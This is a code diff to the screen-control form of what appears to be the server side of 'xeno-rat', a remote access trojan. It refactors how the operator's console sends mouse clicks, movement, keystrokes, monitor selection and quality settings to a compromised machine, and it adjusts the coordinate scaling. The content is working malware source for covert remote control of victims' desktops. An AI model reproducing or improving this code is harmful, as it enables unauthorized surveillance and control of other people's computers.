@@ -10,7 +10,6 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using static System.Net.Mime.MediaTypeNames;
 
 namespace xeno_rat_server.Forms
 {
@@ -19,8 +18,8 @@ namespace xeno_rat_server.Forms
         Node client;
         Node ImageNode;
         bool playing = false;
-        bool operation_pass = true;
         int monitor_index = 0;
+        double scaling_factor = 1;
         Size? current_mon_size = null;
         string[] qualitys = new string[] { "100%","90%", "80%", "70%", "60%", "50%", "40%", "30%", "20%", "10%" };
         public ScreenControl(Node _client)
@@ -82,27 +81,22 @@ namespace xeno_rat_server.Forms
         public async Task<string[]> GetMonitors()
         {
             await client.SendAsync(new byte[] { 2 });
-            int length = client.sock.BytesToInt(await client.ReceiveAsync());
-            string[] monitors = new string[length];
-            for (int i = 0; i < length; i++)
-            {
-                monitors[i] = Encoding.UTF8.GetString(await client.ReceiveAsync());
-            }
-            return monitors;
+            string monsString=Encoding.UTF8.GetString(await client.ReceiveAsync());
+            string[] mons = monsString.Split('\n');
+            return mons;
         }
         public async Task SetQuality(int quality) 
         {
-            await client.SendAsync(new byte[] { 3 });
-            await client.SendAsync(client.sock.IntToBytes(quality));
+            await client.SendAsync(client.sock.Concat(new byte[] { 3 }, client.sock.IntToBytes(quality)));
         }
 
         public async Task SetMonitor(int monitorIndex)
         {
             monitor_index = monitorIndex;
-            await client.SendAsync(new byte[] { 4 });
-            await client.SendAsync(client.sock.IntToBytes(monitorIndex));
-            int Width = client.sock.BytesToInt(await client.ReceiveAsync());
-            int Height = client.sock.BytesToInt(await client.ReceiveAsync());
+            await client.SendAsync(client.sock.Concat(new byte[] { 4 }, client.sock.IntToBytes(monitorIndex)));
+            byte[] hwData = await client.ReceiveAsync();
+            int Width = client.sock.BytesToInt(hwData);
+            int Height = client.sock.BytesToInt(hwData,4);
             current_mon_size = new Size(Width, Height);
             UpdateScaleSize();
         }
@@ -111,16 +105,15 @@ namespace xeno_rat_server.Forms
         {
             if (pictureBox1.Width > ((Size)current_mon_size).Width || pictureBox1.Height > ((Size)current_mon_size).Height)
             {
-                await client.SendAsync(new byte[] { 13 });
-                await client.SendAsync(client.sock.IntToBytes(100));
+                await client.SendAsync(client.sock.Concat(new byte[] { 13 }, client.sock.IntToBytes(10000)));
             }
             else
             {
                 double widthRatio = (double)pictureBox1.Width/ (double)((Size)current_mon_size).Width ;
                 double heightRatio = (double)pictureBox1.Height / (double)((Size)current_mon_size).Height;
-                int factor = (int)(Math.Max(widthRatio, heightRatio)*10000.0);
-                await client.SendAsync(new byte[] { 13 });
-                await client.SendAsync(client.sock.IntToBytes(factor));
+                scaling_factor = Math.Max(widthRatio, heightRatio);
+                int factor = (int)(scaling_factor * 10000.0);
+                await client.SendAsync(client.sock.Concat(new byte[] { 13 }, client.sock.IntToBytes(factor)));
             }
         }
 
@@ -192,8 +185,8 @@ namespace xeno_rat_server.Forms
             float scaleY = (float)targetControl.Image.Height / originalScreenSize.Height;
 
             // Apply the scaling factors
-            int scaledX = (int)(originalCoords.X * scaleX);
-            int scaledY = (int)(originalCoords.Y * scaleY);
+            int scaledX = (int)(originalCoords.X * scaleX/ scaling_factor);
+            int scaledY = (int)(originalCoords.Y * scaleY/ scaling_factor);
 
             // Get the unzoomed and offset-adjusted coordinates
             Point translatedCoords = UnzoomedAndAdjusted(targetControl, new Point(scaledX, scaledY));
@@ -306,77 +299,66 @@ namespace xeno_rat_server.Forms
 
         private async void pictureBox1_MouseClick(object sender, MouseEventArgs e)
         {
-            if (pictureBox1.Image == null || !playing || !operation_pass || !checkBox1.Checked) return;
-            operation_pass = false;
+            if (pictureBox1.Image == null || !playing || !checkBox1.Checked) return;
+            //operation_pass = false
             Point coords = TranslateCoordinates(new Point(e.X, e.Y), (Size)current_mon_size, pictureBox1);
+            byte opcode = 5;
             if (e.Button == MouseButtons.Right)
             {
-                await client.SendAsync(new byte[] { 9 });
+                opcode = 9;
             }
             else if (e.Button == MouseButtons.Middle)
             {
-                await client.SendAsync(new byte[] { 10 });
+                opcode = 10;
             }
-            else
-            {
-                await client.SendAsync(new byte[] { 5 });
-            }
-            await client.SendAsync(client.sock.IntToBytes(coords.X));
-            await client.SendAsync(client.sock.IntToBytes(coords.Y));
-            operation_pass = true;
+            byte[] payload = client.sock.Concat(new byte[] { opcode }, client.sock.IntToBytes(coords.X));
+            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
+            await client.SendAsync(payload);
 
         }
 
         private async void pictureBox1_MouseDoubleClick(object sender, MouseEventArgs e)
         {
-            if (current_mon_size==null|| pictureBox1.Image == null || !playing || e.Button == MouseButtons.Right || e.Button==MouseButtons.Middle || !operation_pass || !checkBox1.Checked) return;
-            operation_pass = false;
+            if (current_mon_size==null|| pictureBox1.Image == null || !playing || e.Button == MouseButtons.Right || e.Button==MouseButtons.Middle || !checkBox1.Checked) return;
             Point coords = TranslateCoordinates(new Point(e.X, e.Y), (Size)current_mon_size, pictureBox1);
-            await client.SendAsync(new byte[] { 6 });
-            await client.SendAsync(client.sock.IntToBytes(coords.X));
-            await client.SendAsync(client.sock.IntToBytes(coords.Y));
-            operation_pass = true;
+            byte[] payload = client.sock.Concat(new byte[] { 6 }, client.sock.IntToBytes(coords.X));
+            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
+            await client.SendAsync(payload);
         }
 
         private async void pictureBox1_MouseUp(object sender, MouseEventArgs e)
         {
             //return;
-            if (current_mon_size == null || pictureBox1.Image == null || !playing || e.Button==MouseButtons.Right || e.Button == MouseButtons.Middle || !operation_pass || !checkBox1.Checked) return;
-            operation_pass = false;
+            if (current_mon_size == null || pictureBox1.Image == null || !playing || e.Button==MouseButtons.Right || e.Button == MouseButtons.Middle || !checkBox1.Checked) return;
             Point coords = TranslateCoordinates(new Point(e.X, e.Y), (Size)current_mon_size, pictureBox1);
-            await client.SendAsync(new byte[] { 7 });
-            await client.SendAsync(client.sock.IntToBytes(coords.X));
-            await client.SendAsync(client.sock.IntToBytes(coords.Y));
-            operation_pass = true;
+            byte[] payload = client.sock.Concat(new byte[] { 7 }, client.sock.IntToBytes(coords.X));
+            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
+            await client.SendAsync(payload);
         }
 
         private async void pictureBox1_MouseMove(object sender, MouseEventArgs e)
         {
-            if (current_mon_size == null || pictureBox1.Image == null || !playing || !operation_pass || !checkBox1.Checked) return;
+            if (current_mon_size == null || pictureBox1.Image == null || !playing || !checkBox1.Checked) return;
             //return;
-            operation_pass = false;
             Point coords = TranslateCoordinates(new Point(e.X, e.Y), (Size)current_mon_size, pictureBox1);
-            await client.SendAsync(new byte[] { 11 });
-            await client.SendAsync(client.sock.IntToBytes(coords.X));
-            await client.SendAsync(client.sock.IntToBytes(coords.Y));
-            operation_pass = true;
+            byte[] payload = client.sock.Concat(new byte[] { 11 }, client.sock.IntToBytes(coords.X));
+            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
+            await client.SendAsync(payload);
         }
 
         private async void pictureBox1_MouseDown(object sender, MouseEventArgs e)
         {
             //return;
-            if (current_mon_size == null || pictureBox1.Image == null || !playing || e.Button == MouseButtons.Right || e.Button == MouseButtons.Middle || !operation_pass || !checkBox1.Checked) return;
-            operation_pass = false;
+            if (current_mon_size == null || pictureBox1.Image == null || !playing || e.Button == MouseButtons.Right || e.Button == MouseButtons.Middle || !checkBox1.Checked) return;
             Point coords = TranslateCoordinates(new Point(e.X, e.Y), (Size)current_mon_size, pictureBox1);
-            await client.SendAsync(new byte[] { 8 });
-            await client.SendAsync(client.sock.IntToBytes(coords.X));
-            await client.SendAsync(client.sock.IntToBytes(coords.Y));
-            operation_pass = true;
+            byte[] payload = client.sock.Concat(new byte[] { 8 }, client.sock.IntToBytes(coords.X));
+            payload = client.sock.Concat(payload, client.sock.IntToBytes(coords.Y));
+            await client.SendAsync(payload);
         }
 
         private void pictureBox1_PreviewKeyDown(object sender, PreviewKeyDownEventArgs e)
         {
-            if (current_mon_size == null || pictureBox1.Image == null || !playing || !operation_pass || !checkBox1.Checked) return;
+            if (current_mon_size == null || pictureBox1.Image == null || !playing || !checkBox1.Checked) return;
         }
 
         private void pictureBox1_Click(object sender, EventArgs e)
@@ -396,11 +378,8 @@ namespace xeno_rat_server.Forms
 
         private async void ScreenControl_KeyUp(object sender, KeyEventArgs e)
         {
-            if (current_mon_size == null || pictureBox1.Image == null || !playing || !operation_pass || !checkBox1.Checked) return;
-            operation_pass = false;
-            await client.SendAsync(new byte[] { 12 });
-            await client.SendAsync(client.sock.IntToBytes(e.KeyValue));
-            operation_pass = true;
+            if (current_mon_size == null || pictureBox1.Image == null || !playing || !checkBox1.Checked) return;
+            await client.SendAsync(client.sock.Concat(new byte[] { 12 }, client.sock.IntToBytes(e.KeyValue)));
         }
 
         private void checkBox1_CheckedChanged(object sender, EventArgs e)
